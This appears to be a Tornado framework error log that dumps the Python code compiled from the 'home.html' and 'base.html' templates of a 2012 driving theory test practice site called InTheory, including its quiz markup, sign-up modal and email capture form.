436      _append('</a></li>\n<li><a class="choice" ind="3"><span class="badge badge-info">D</span> ')  # home.html:31 (via base.html:76)
437      _tmp = question.options[3]  # home.html:31 (via base.html:76)
438      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:31 (via base.html:76)
439      else: _tmp = _utf8(str(_tmp))  # home.html:31 (via base.html:76)
440      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:31 (via base.html:76)
441      _append(_tmp)  # home.html:31 (via base.html:76)
442      _append('</a></li>\n</ul>\n<a id="next" class="btn btn-success btn-mini disabled">Next Question</a>\n</div>\n</div>\n</div>\n</div>\n</div>\n<div class="row">\n<div class="span10">\n</div>\n<div class="span5 offset5">\n</br></br>\n<blockquote>\n<p>\n<h2><div class="funkytext"><font color="#ffffff">"')  # home.html:47 (via base.html:76)
443      _tmp = kwargs['tweet']  # home.html:47 (via base.html:76)
444      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:47 (via base.html:76)
445      else: _tmp = _utf8(str(_tmp))  # home.html:47 (via base.html:76)
446      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:47 (via base.html:76)
447      _append(_tmp)  # home.html:47 (via base.html:76)
448      _append('"</h2>\n<div class="funkytext">- Dave Mason, London</font></div>\n</p>\n</blockquote>\n</div>\n</div>\n</div> <!-- /container -->\n<div id="dim">\n</div>\n')  # home.html:57 (via base.html:76)
449      _append('\n')  # base.html:80
450      _tmp = xsrf_form_html()  # base.html:80
451      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:80
452      else: _tmp = _utf8(str(_tmp))  # base.html:80
453      _append(_tmp)  # base.html:80
454      _append('\n')  # base.html:81
455      _append('\n<script src="')  # base.html:82 (via base.html:81)
456      _tmp = static_url('js/libs/jquery-1.7.2.min.js')  # base.html:82 (via base.html:81)
457      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:82 (via base.html:81)
458      else: _tmp = _utf8(str(_tmp))  # base.html:82 (via base.html:81)
459      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:82 (via base.html:81)
460      _append(_tmp)  # base.html:82 (via base.html:81)
461      _append('"></script>\n<script src="')  # base.html:83 (via base.html:81)
462      _tmp = static_url('js/libs/blurb.min.js')  # base.html:83 (via base.html:81)
463      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:83 (via base.html:81)
464      else: _tmp = _utf8(str(_tmp))  # base.html:83 (via base.html:81)
465      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:83 (via base.html:81)
466      _append(_tmp)  # base.html:83 (via base.html:81)
467      _append('"></script>\n<script src="')  # base.html:84 (via base.html:81)
468      _tmp = static_url('js/IT.js')  # base.html:84 (via base.html:81)
469      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:84 (via base.html:81)
470      else: _tmp = _utf8(str(_tmp))  # base.html:84 (via base.html:81)
471      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:84 (via base.html:81)
472      _append(_tmp)  # base.html:84 (via base.html:81)
473      _append('"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-dropdown.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-button.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-modal.js"></script>\n')  # base.html:88 (via base.html:81)
474      _append('\n')  # base.html:90
475      for js in kwargs['js_deps']:  # base.html:90
476          _append('\n<script src="')  # base.html:91
477          _tmp = static_url(js)  # base.html:91
478          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:91
479          else: _tmp = _utf8(str(_tmp))  # base.html:91
480          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:91
481          _append(_tmp)  # base.html:91
482          _append('"></script>\n')  # base.html:92
483      _append('\n')  # base.html:94
484      _append('\n<script id="signup-template" type="text/x-jquery-tmpl">\n<div id="windowTitleDialog" class="modal hide fade">\n<div class="modal-header">\n<a class="close">&times;</a>\n<h3>You scored ${score} out of 10!</h3>\n</div>\n<div class="modal-body">\n<p>You still need a little practice, but don\'t worry we\'re here to help you pass. Sign-up today to get started...</p>\n<a href="/login"><center><img src="')  # home.html:68 (via base.html:94)
485      _tmp = static_url('imgs/facebook.png')  # home.html:68 (via base.html:94)
486      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:68 (via base.html:94)
487      else: _tmp = _utf8(str(_tmp))  # home.html:68 (via base.html:94)
488      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:68 (via base.html:94)
489      _append(_tmp)  # home.html:68 (via base.html:94)
490      _append('" alt="some_text"/></a>\n<img src="')  # home.html:69 (via base.html:94)
491      _tmp = static_url('imgs/twitter.png')  # home.html:69 (via base.html:94)
492      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:69 (via base.html:94)
493      else: _tmp = _utf8(str(_tmp))  # home.html:69 (via base.html:94)
494      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:69 (via base.html:94)
495      _append(_tmp)  # home.html:69 (via base.html:94)
496      _append('" alt="some_text"/>\n<img src="')  # home.html:70 (via base.html:94)
497      _tmp = static_url('imgs/google.png')  # home.html:70 (via base.html:94)
498      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:70 (via base.html:94)
499      else: _tmp = _utf8(str(_tmp))  # home.html:70 (via base.html:94)
500      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:70 (via base.html:94)
501      _append(_tmp)  # home.html:70 (via base.html:94)
502      _append('" alt="some_text"/></center>\n<center><a href="h">Or click here to sign-up directly</a></center>\n</div>\n<div class="modal-footer">\n<ul class="pager">\n<li class="previous"><a href="#">Sign in to InTheory</a></li>\n<li class="next"><a href="#">Forgot username or password?</a></li>\n</ul>\n</div>\n</div>\n</script>\n<script id="show-arrow-template" type="text/x-jquery-tmpl">\n<div class="arrow-container">\n<img src="')  # home.html:84 (via base.html:94)
503      _tmp = static_url('imgs/arrow.png')  # home.html:84 (via base.html:94)
504      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:84 (via base.html:94)
505      else: _tmp = _utf8(str(_tmp))  # home.html:84 (via base.html:94)
506      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:84 (via base.html:94)
507      _append(_tmp)  # home.html:84 (via base.html:94)
508      _append('"/>\n</div>\n</script>\n<script id="email-template" type="text/x-jquery-tmpl">\n<div id="windowTitleDialog" class="modal hide fade">\n<div class="modal-header">\n<a class="close">&times;</a>\n<h3>You scored ${score} out of 10!</h3>\n</div>\n<div class="modal-body">\n<center>\n<p>Leave your email and we\'ll let you know when we launch!</p>\n<form method="post" class="af-form-wrapper" action="http://www.aweber.com/scripts/addlead.pl" >\n<div style="display: none;">\n<input type="hidden" name="meta_web_form_id" value="677441365" />\n<input type="hidden" name="meta_split_id" value="" />\n<input type="hidden" name="listname" value="intheory" />\n<input type="hidden" name="redirect" value="http://www.aweber.com/thankyou-coi.htm?m=video" id="redirect_b3be9783c304109a8d9d9ca013e7b651" />\n<input type="hidden" name="meta_adtracking" value="Waiting_List_/_Splash" />\n<input type="hidden" name="meta_message" value="1" />\n<input type="hidden" name="meta_required" value="name,email" />\n<input type="hidden" name="meta_tooltip" value="" />\n</div>\n<div id="af-form-677441365" class="af-form"><div id="af-body-677441365" class="af-body af-standards">\n<div class="af-element">\n<div class="af-textWrap"></br>\n<input id="awf_field-39151245" type="text" name="name" class="text" placeholder="Enter Your Name" tabindex="500" />\n</div>\n<div class="af-clear"></div></div>\n<div class="af-element">\n<div class="af-textWrap"><input class="text" id="awf_field-39151246" type="text" name="email" placeholder="Enter Your Email" tabindex="501" />\n</div><div class="af-clear"></div>\n</div>\n<input name="submit" class="btn btn-primaryw" type="submit" value="Submit" tabindex="502" />\n</br>\n<a href="/login">or connect with Facebook</a>\n</div>\n</br></br>\n<div class="af-element privacyPolicy" style="text-align: center"><p>We respect your <a title="Privacy Policy" href="http://www.aweber.com/permission.htm" target="_blank">email privacy</a></p>\n<div class="af-clear"></div>\n</div>\n</div>\n</div>\n<div style="display: none;"><img src="http://forms.aweber.com/form/displays.htm?id=bOzsLCyMzGys" alt="" /></div>\n</form>\n</center>\n<script type="text/javascript">\n<!--\n(function() {\nvar IE = /*@cc_on!@*/false;\nif (!IE) { return; }\nif (document.compatMode && document.compatMode == \'BackCompat\') {\nif (document.getElementById("af-form-677441365")) {\ndocument.getElementById("af-form-677441365").className = \'af-form af-quirksMode\';\n}\nif (document.getElementById("af-body-677441365")) {\ndocument.getElementById("af-body-677441365").className = "af-body inline af-quirksMode";\n}\nif (document.getElementById("af-header-677441365")) {\ndocument.getElementById("af-header-677441365").className = "af-header af-quirksMode";\n}\nif (document.getElementById("af-footer-677441365")) {\ndocument.getElementById("af-footer-677441365").className = "af-footer af-quirksMode";\n}\n}\n})();\n-->\n</script>\n</div>\n</div>\n</script>\n')  # home.html:158 (via base.html:94)
509      _append('\n<div class="container">\n<div class="footer"><font color="#FFFFFF" size="2px"> <p class="alignleft">InTheory Media Limited \xc2\xa9 2012</p>\n<p class="alignright">About Us | Terms & Conditions | Privacy Policy | Support </p></font></br>\n</div>\n</div>\n</body>\n</html>\n')  # base.html:106
510      return _utf8('').join(_buffer)  # base.html:0
ERROR:root:home.html code:
  1  def _execute():  # base.html:0
  2      _buffer = []  # base.html:0
  3      _append = _buffer.append  # base.html:0
  4      _append('<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\n<!--[if lt IE 7 ]> <html lang="en" class="no-js ie6"> <![endif]-->\n<!--[if IE 7 ]> <html lang="en" class="no-js ie7"> <![endif]-->\n<!--[if IE 8 ]> <html lang="en" class="no-js ie8"> <![endif]-->\n<!--[if IE 9 ]> <html lang="en" class="no-js ie9"> <![endif]-->\n<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en" class="no-js"> <!--<![endif]-->\n<head xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml">\n<meta charset="utf-8">\n<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">\n<meta name="author" content="intheory">\n<meta name="description" content="Intheory 2012">\n<meta property="og:image" content="http://www.petrominpng.com.pg/images/logo_big.png" />\n<meta name="viewport" content="width=920, initial-scale=auto">\n<meta property="og:type" content="website" />\n<meta property="og:title" content="Intheory 2012" />\n<meta property="og:site_name" content="Intheory 2012" />\n<title>\n')  # base.html:19
  5      _append('\nInTheory | Pass Your Theory Test. Guaranteed.\n')  # base.html:21 (via base.html:19)
  6      _append('\n</title>\n<link href="../static/css/bootstrap.css" rel="stylesheet">\n<link href="../static/css/bootstrap-responsive.css" rel="stylesheet">\n<link rel="stylesheet" href="')  # base.html:25
  7      _tmp = static_url('css/base.css')  # base.html:25
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:25
  9      else: _tmp = _utf8(str(_tmp))  # base.html:25
 10      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:25
 11      _append(_tmp)  # base.html:25
 12      _append('" />\n')  # base.html:26
 13      for css in kwargs['css_deps']:  # base.html:26
 14          _append('\n<link href="')  # base.html:27
 15          _tmp = static_url(css)  # base.html:27
 16          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:27
 17          else: _tmp = _utf8(str(_tmp))  # base.html:27
 18          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:27
 19          _append(_tmp)  # base.html:27
 20          _append('" rel="stylesheet">\n')  # base.html:28
 21      _append('\n<style type="text/css">\nhtml{\nbackground-image: url(/static/imgs/background.jpg);\nbackground-repeat: no-repeat;\n}\nbody {\npadding-top: 60px;\npadding-bottom: 40px;\n}\n</style>\n</head>\n<body >\n')  # base.html:44
 22      _append('\n<div class="navbar navbar-fixed-top">\n<div class="navbar-inner">\n<div class="container">\n<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n</a>\n<a class="brand" href="/"> <img src="')  # base.html:53 (via base.html:44)
 23      _tmp = static_url('imgs/logo.png')  # base.html:53 (via base.html:44)
 24      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:53 (via base.html:44)
 25      else: _tmp = _utf8(str(_tmp))  # base.html:53 (via base.html:44)
 26      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:53 (via base.html:44)
 27      _append(_tmp)  # base.html:53 (via base.html:44)
 28      _append('"></a>\n<div class="pull-right">\n')  # base.html:55 (via base.html:44)
 29      if not current_user:  # base.html:55 (via base.html:44)
 30          _append('\n<a href="/login"><button type="submit" class="btn btn-success">Sign in</button></a>\n')  # base.html:57 (via base.html:44)
 31      else:  # base.html:57 (via base.html:44)
 32          _append('\n<ul class="nav nav-pills">\n')  # base.html:59 (via base.html:44)
 33          if current_user['moderator']:  # base.html:59 (via base.html:44)
 34              _append('\n<li id="admin-nav"><a href="/admin">Admin</a></li>\n')  # base.html:61 (via base.html:44)
 35          _append('\n<li class="active"><a href="/learn/main">Learn</a></li>\n<li id="mock-test-nav"><a href="/test/new">Mock Test</a></li>\n<li><a href="#">Book Test</a></li>\n<li><a href="/logout">Logout</a></li>\n<li>|</li>\n</ul>\n<a class="brand1" href="/dashboard"> <img src="')  # base.html:68 (via base.html:44)
 36          _tmp = static_url('imgs/user.png')  # base.html:68 (via base.html:44)
 37          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:68 (via base.html:44)
 38          else: _tmp = _utf8(str(_tmp))  # base.html:68 (via base.html:44)
 39          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:68 (via base.html:44)
 40          _append(_tmp)  # base.html:68 (via base.html:44)
 41          _append('"></a>\n')  # base.html:69 (via base.html:44)
 42      _append('\n</div>\n</div>\n</div>\n</div>\n')  # base.html:74 (via base.html:44)
 43      _append('\n')  # base.html:76
 44      _append('\n<div class="container">\n<div class="hero-unit">\n<div class="hero-unit1">\n<div class="row-fluid">\n<div class="columnA pull-left">\n<h2>Pass your theory test.<br>Guaranteed.</h2>\n<ul>\n<li>The simplest and fastest way to pass your test.</li>\n<li>Use cool new learning techniques to help you remember the details.</li>\n<li>Don\'t pass first time? Get your money back.</li>\n</ul></br>\n<p><a id="get-started-btn" class="btn btn-block btn-success btn-large">Get Started Today</a></p>\n</div>\n<div class="columnB pull-right">\n</br>\n<div id="questions" data-questions=\n\'[{ "question":"')  # home.html:21 (via base.html:76)
 45      _tmp = kwargs["questions"][0].question  # home.html:21 (via base.html:76)
 46      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 47      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 48      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 49      _append(_tmp)  # home.html:21 (via base.html:76)
 50      _append('","options": ["')  # home.html:21 (via base.html:76)
 51      _tmp = kwargs["questions"][0].options[0]  # home.html:21 (via base.html:76)
 52      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 53      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 54      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 55      _append(_tmp)  # home.html:21 (via base.html:76)
 56      _append('", "')  # home.html:21 (via base.html:76)
 57      _tmp = kwargs["questions"][0].options[1]  # home.html:21 (via base.html:76)
 58      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 59      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 60      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 61      _append(_tmp)  # home.html:21 (via base.html:76)
 62      _append('", "')  # home.html:21 (via base.html:76)
 63      _tmp = kwargs["questions"][0].options[2]  # home.html:21 (via base.html:76)
 64      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 65      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 66      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 67      _append(_tmp)  # home.html:21 (via base.html:76)
 68      _append('", "')  # home.html:21 (via base.html:76)
 69      _tmp = kwargs["questions"][0].options[3]  # home.html:21 (via base.html:76)
 70      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 71      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 72      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 73      _append(_tmp)  # home.html:21 (via base.html:76)
 74      _append('"],"answer": ')  # home.html:21 (via base.html:76)
 75      _tmp = kwargs["questions"][0].answer  # home.html:21 (via base.html:76)
 76      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 77      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 78      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 79      _append(_tmp)  # home.html:21 (via base.html:76)
 80      _append('},{ "question":"')  # home.html:21 (via base.html:76)
 81      _tmp = kwargs["questions"][1].question  # home.html:21 (via base.html:76)
 82      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 83      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 84      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 85      _append(_tmp)  # home.html:21 (via base.html:76)
 86      _append('","options": ["')  # home.html:21 (via base.html:76)
 87      _tmp = kwargs["questions"][1].options[0]  # home.html:21 (via base.html:76)
 88      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 89      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 90      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 91      _append(_tmp)  # home.html:21 (via base.html:76)
 92      _append('", "')  # home.html:21 (via base.html:76)
 93      _tmp = kwargs["questions"][1].options[1]  # home.html:21 (via base.html:76)
 94      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 95      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 96      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 97      _append(_tmp)  # home.html:21 (via base.html:76)
 98      _append('", "')  # home.html:21 (via base.html:76)
 99      _tmp = kwargs["questions"][1].options[2]  # home.html:21 (via base.html:76)
100      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
101      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
102      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
103      _append(_tmp)  # home.html:21 (via base.html:76)
104      _append('", "')  # home.html:21 (via base.html:76)
105      _tmp = kwargs["questions"][1].options[3]  # home.html:21 (via base.html:76)
106      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
107      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
108      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
109      _append(_tmp)  # home.html:21 (via base.html:76)
110      _append('"],"answer": ')  # home.html:21 (via base.html:76)
111      _tmp = kwargs["questions"][1].answer  # home.html:21 (via base.html:76)
112      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
113      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
114      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
115      _append(_tmp)  # home.html:21 (via base.html:76)
116      _append('}, { "question":"')  # home.html:21 (via base.html:76)
117      _tmp = kwargs["questions"][2].question  # home.html:21 (via base.html:76)
118      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
119      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
120      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
121      _append(_tmp)  # home.html:21 (via base.html:76)
122      _append('","options": ["')  # home.html:21 (via base.html:76)
123      _tmp = kwargs["questions"][2].options[0]  # home.html:21 (via base.html:76)
124      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
125      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
126      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
127      _append(_tmp)  # home.html:21 (via base.html:76)
128      _append('", "')  # home.html:21 (via base.html:76)
129      _tmp = kwargs["questions"][2].options[1]  # home.html:21 (via base.html:76)
130      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
131      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
132      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
133      _append(_tmp)  # home.html:21 (via base.html:76)
134      _append('", "')  # home.html:21 (via base.html:76)
135      _tmp = kwargs["questions"][2].options[2]  # home.html:21 (via base.html:76)
136      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
137      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
138      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
139      _append(_tmp)  # home.html:21 (via base.html:76)
140      _append('", "')  # home.html:21 (via base.html:76)
141      _tmp = kwargs["questions"][2].options[3]  # home.html:21 (via base.html:76)
142      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
143      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
144      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
145      _append(_tmp)  # home.html:21 (via base.html:76)
146      _append('"],"answer": ')  # home.html:21 (via base.html:76)
147      _tmp = kwargs["questions"][2].answer  # home.html:21 (via base.html:76)
148      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
149      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
150      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
151      _append(_tmp)  # home.html:21 (via base.html:76)
152      _append('},{ "question":"')  # home.html:21 (via base.html:76)
153      _tmp = kwargs["questions"][3].question  # home.html:21 (via base.html:76)
154      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
155      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
156      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
157      _append(_tmp)  # home.html:21 (via base.html:76)
158      _append('","options": ["')  # home.html:21 (via base.html:76)
159      _tmp = kwargs["questions"][3].options[0]  # home.html:21 (via base.html:76)
160      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
161      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
162      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
163      _append(_tmp)  # home.html:21 (via base.html:76)
164      _append('", "')  # home.html:21 (via base.html:76)
165      _tmp = kwargs["questions"][3].options[1]  # home.html:21 (via base.html:76)
166      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
167      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
168      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
169      _append(_tmp)  # home.html:21 (via base.html:76)
170      _append('", "')  # home.html:21 (via base.html:76)
171      _tmp = kwargs["questions"][3].options[2]  # home.html:21 (via base.html:76)
172      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
173      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
174      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
175      _append(_tmp)  # home.html:21 (via base.html:76)
176      _append('", "')  # home.html:21 (via base.html:76)
177      _tmp = kwargs["questions"][3].options[3]  # home.html:21 (via base.html:76)
178      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
179      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
180      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
181      _append(_tmp)  # home.html:21 (via base.html:76)
182      _append('"],"answer": ')  # home.html:21 (via base.html:76)
183      _tmp = kwargs["questions"][3].answer  # home.html:21 (via base.html:76)
184      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
185      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
186      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
187      _append(_tmp)  # home.html:21 (via base.html:76)
188      _append('}, { "question":"')  # home.html:21 (via base.html:76)
189      _tmp = kwargs["questions"][4].question  # home.html:21 (via base.html:76)
190      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
191      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
192      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
193      _append(_tmp)  # home.html:21 (via base.html:76)
194      _append('","options": ["')  # home.html:21 (via base.html:76)
195      _tmp = kwargs["questions"][4].options[0]  # home.html:21 (via base.html:76)
196      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
197      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
198      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
199      _append(_tmp)  # home.html:21 (via base.html:76)
200      _append('", "')  # home.html:21 (via base.html:76)
201      _tmp = kwargs["questions"][4].options[1]  # home.html:21 (via base.html:76)
202      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
203      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
204      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
205      _append(_tmp)  # home.html:21 (via base.html:76)
206      _append('", "')  # home.html:21 (via base.html:76)
207      _tmp = kwargs["questions"][4].options[2]  # home.html:21 (via base.html:76)
208      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
209      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
210      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
211      _append(_tmp)  # home.html:21 (via base.html:76)
212      _append('", "')  # home.html:21 (via base.html:76)
213      _tmp = kwargs["questions"][4].options[3]  # home.html:21 (via base.html:76)
214      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
215      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
216      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
217      _append(_tmp)  # home.html:21 (via base.html:76)
218      _append('"],"answer": ')  # home.html:21 (via base.html:76)
219      _tmp = kwargs["questions"][4].answer  # home.html:21 (via base.html:76)
220      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
221      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
222      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
223      _append(_tmp)  # home.html:21 (via base.html:76)
224      _append('},{ "question":"')  # home.html:21 (via base.html:76)
225      _tmp = kwargs["questions"][5].question  # home.html:21 (via base.html:76)
226      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
227      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
228      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
229      _append(_tmp)  # home.html:21 (via base.html:76)
230      _append('","options": ["')  # home.html:21 (via base.html:76)
231      _tmp = kwargs["questions"][5].options[0]  # home.html:21 (via base.html:76)
232      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
233      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
234      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
235      _append(_tmp)  # home.html:21 (via base.html:76)
236      _append('", "')  # home.html:21 (via base.html:76)
237      _tmp = kwargs["questions"][5].options[1]  # home.html:21 (via base.html:76)
238      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
239      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
240      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
241      _append(_tmp)  # home.html:21 (via base.html:76)
242      _append('", "')  # home.html:21 (via base.html:76)
243      _tmp = kwargs["questions"][5].options[2]  # home.html:21 (via base.html:76)
244      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
245      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
246      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
247      _append(_tmp)  # home.html:21 (via base.html:76)
248      _append('", "')  # home.html:21 (via base.html:76)
